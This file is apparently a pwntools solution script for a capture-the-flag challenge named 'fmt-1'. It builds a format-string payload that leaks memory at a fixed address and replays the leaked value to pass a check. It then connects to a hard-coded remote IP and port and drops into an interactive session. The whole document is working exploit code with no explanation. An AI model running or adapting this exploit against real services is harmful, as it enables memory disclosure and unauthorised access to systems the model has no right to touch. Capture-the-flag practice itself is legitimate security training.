#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib

c = 0
pwn_file = "./fmt-1"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
# context.log_level = 'debug'
c = process(pwn_file)
c = remote('140.110.112.77', '4002')
c.sendafter('Input:', flat({0:"%{}$s".format(9), 8: p64(0x404050)}, length=0x20))
c.sendlineafter('Input:', c.recvn(16))
c.interactive()
c.close()
